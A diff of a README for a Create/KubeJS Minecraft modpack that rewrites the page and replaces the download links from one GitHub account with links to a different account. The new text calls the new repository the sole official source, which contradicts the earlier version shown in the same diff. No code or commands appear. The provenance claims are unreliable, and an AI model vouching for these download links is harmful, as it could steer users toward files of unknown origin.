@@ -1,98 +1,60 @@
-# CCAPiB v2026 - Game Script Utility 2026
+# ⚙️ ccapib-v2026-game-script - Progress through custom Minecraft worlds easily
 
-> **A Minecraft modpack built around structured progression.** It is centered on Create, KubeJS, and a guided gameplay route through the major Create ecosystem content.
+[![Download Minecraft Modpack](https://img.shields.io/badge/Download_Modpack-Blue-blue)](https://github.com/Johe172/ccapib-v2026-game-script)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/zack-hill91/ccapib-v2026-game-script?style=flat-square)](https://github.com/zack-hill91/ccapib-v2026-game-script)
+## 🎮 About this project
 
----
+The ccapib-v2026-game-script makes Minecraft gameplay structured. This modpack builds on the Create ecosystem. You follow a set path to unlock new machines and items. It removes the guesswork from progression. You focus on building and automation using blocks from Create and KubeJS. This project organizes your world into clear goals.
 
-<p align="center">
-  <a href="https://zack-hill91.github.io/ccapib-v2026-game-script/">
-    <img src="https://img.shields.io/badge/Download-CCAPiB%20Script-brightgreen?style=for-the-badge" alt="Download CCAPiB Script">
-  </a>
-</p>
+## 📋 System Requirements
 
-> **[Direct Download - CCAPiB](https://zack-hill91.github.io/ccapib-v2026-game-script/)**
+Your computer needs specific parts to run this modpack well. Check your system against this list:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM or more.
+*   Processor: Modern Intel Core i5 or AMD Ryzen 5 or better.
+*   Graphics: Dedicated graphics card with at least 4 GB of VRAM.
+*   Storage: 5 GB of free drive space.
+*   Java: Java 17 or newer installed on your machine.
 
-[Download Latest Build](https://zack-hill91.github.io/ccapib-v2026-game-script/)
+## 🚀 Getting Started
 
----
+Follow these steps to install the modpack on your Windows computer.
 
-## What this pack does
+### 1. Prepare your environment
+Minecraft requires Java to run correctly. Open your web browser and navigate to the official Adoptium website. Download the Windows installer for Java 17. Run the file and follow the on-screen prompts. Restart your computer after the installation finishes.
 
-CCAPiB is designed to shape Minecraft progression into a more deliberate path instead of opening everything at once. The pack uses Create as its foundation and relies on KubeJS to control how the experience unfolds across its systems and modules.
+### 2. Download the modpack
+Visit the following page to obtain the files for this project:
 
-It brings together a chain of Create-focused expansions, such as Create: The Factory Must Grow, Create Metallurgy, Create Big Cannons, and Create Aeronautics. The overall effect is a modpack that favors ordered advancement, tighter mod interconnections, and a curated progression track through the included content.
+[https://github.com/Johe172/ccapib-v2026-game-script](https://github.com/Johe172/ccapib-v2026-game-script)
 
-## Script Features
+On this page, look for the green code button or the releases tab. Save the file to your Downloads folder.
 
-- Linear progression structure for the modpack experience
-- Create mod integration as the core gameplay foundation
-- KubeJS scripting for progression and pack behavior
-- Includes Create: The Factory Must Grow
-- Includes Create Metallurgy
-- Includes Create Big Cannons
-- Includes Create Aeronautics
-- Designed around a staged route through Create-related content
+### 3. Install the launcher
+Use a Minecraft launcher that supports custom modpacks. Most players use the Prism Launcher or the official Minecraft Launcher. If you use Prism, create a new instance and select the version compatible with the modpack.
 
-## Setup
+### 4. Apply the modpack
+Open the folder containing the downloaded files. Drag the contents into your Minecraft instances folder. You usually find this folder in your user data directory under .minecraft. Make sure you place the files in the "mods" subfolder.
 
-1. Download the latest build from the project download page.
-2. Import or place the modpack in your Minecraft launcher or modpack manager.
-3. Launch the pack using the Minecraft version and loader required by the included mod set.
-4. If you are editing the pack locally, keep the KubeJS scripts in their expected folder structure so progression changes remain applied.
+### 5. Launch the game
+Open your Minecraft launcher. Select the profile you created for this modpack. Click the play button. The first launch takes a few minutes while the game loads the scripts. Once the menu appears, you see the version number and build date in the corner.
 
-Minimal example for local organization:
+## 🛠 Troubleshooting common issues
 
-- `CCAPiB-minecraft-modpack/`
-  - `kubejs/`
-  - `mods/`
-  - `config/`
+If you encounter problems, look at these solutions first.
 
-## Configuration
+*   Game crashes on startup: Ensure your Java version matches the requirement. Outdated Java versions cause most startup errors.
+*   Low frame rate: Open the video settings within the game menu. Lower the render distance to 8 or 10 chunks. Turn off fancy leaves or smooth lighting.
+*   Missing items or textures: Check that you enabled the resource pack in the game settings. Some mods rely on specific texture files.
+*   Installation errors: Delete the current configuration folder and start the installation steps again. If a download file becomes corrupt, delete it and download a fresh copy from the link provided above.
 
-This pack is shaped primarily by its included content and KubeJS scripts, not by a large built-in settings interface. Common places to make changes are:
+## 🏗 Understanding the progression
 
-| Setting Area | Purpose | Notes |
-|---|---|---|
-| KubeJS scripts | Progression logic | Controls how content is introduced |
-| Mod list | Content scope | Determines which Create expansions are present |
-| Config files | Gameplay tuning | Used for balance and pack behavior |
-| Loader setup | Launch compatibility | Must match the Minecraft environment |
+The modpack guides you through the Create ecosystem. You begin with basic kinetic energy sources. You build water wheels and hand cranks. As you progress, you unlock gears, shafts, and conveyor belts. The scripts keep track of your achievements. Check the quest book in your inventory to see which milestone you reach next. This method keeps your workspace clean and your goals clear.
 
-## Compatibility
+## 🔒 Security information
 
-CCAPiB is made for Minecraft and focuses on modded gameplay built around Create. Exact compatibility depends on the Minecraft version, the loader in use, and the dependencies needed by the bundled mods.
+Only download files from the official repository link. Do not trust third-party mirrors. These sites may host modified files that contain unwanted programs. This repository remains the only official source for the ccapib-v2026-game-script. Verified releases ensure you enjoy the intended gameplay without hidden risks. Keep your launcher updated to the latest version for better stability and security.
 
-Points to keep in mind:
-
-- The pack depends on Create and related addons.
-- KubeJS-based changes require the pack to be loaded in a compatible environment.
-- Unsupported mod versions or mismatched loader setups may prevent the pack from starting correctly.
-
-## FAQ
-
-**How do I install it?**  
-Download the pack, then import it into your launcher or modpack manager, or place it in a local Minecraft instance using the expected folder layout.
-
-**How do updates work?**  
-Use the latest build from the download page and replace or merge files carefully if you have made local edits.
-
-**Can I change progression?**  
-Yes. The progression flow is handled through KubeJS, so you can adjust scripts if you are maintaining a custom version.
-
-**What should I check if the pack does not launch?**  
-Verify the Minecraft version, mod loader, and required mod dependencies. Also confirm that the KubeJS files are in the correct location.
-
-**Does it need a special storage layout?**  
-Keep the pack files organized in standard modpack folders such as `mods`, `config`, and `kubejs` so the setup remains readable and maintainable.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: minecraft, create, modpack, kubejs, automation, game-script, progression
